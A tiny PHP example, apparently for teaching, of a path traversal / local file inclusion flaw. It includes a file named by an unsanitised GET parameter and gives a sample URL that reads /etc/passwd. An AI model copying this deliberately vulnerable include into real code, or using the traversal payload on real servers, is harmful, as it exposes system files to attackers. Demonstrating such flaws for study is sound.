<?php
  $file = $_GET['filename'];
  include("/var/www/html".$file);
?>

/*
 *            ###  DIRECTORY PATH TRAVERSAL 
 * http://localhost
 * http://localhost/example.php
 * http://localhost/example.php?filename=../../../../../etc/passwd
 */
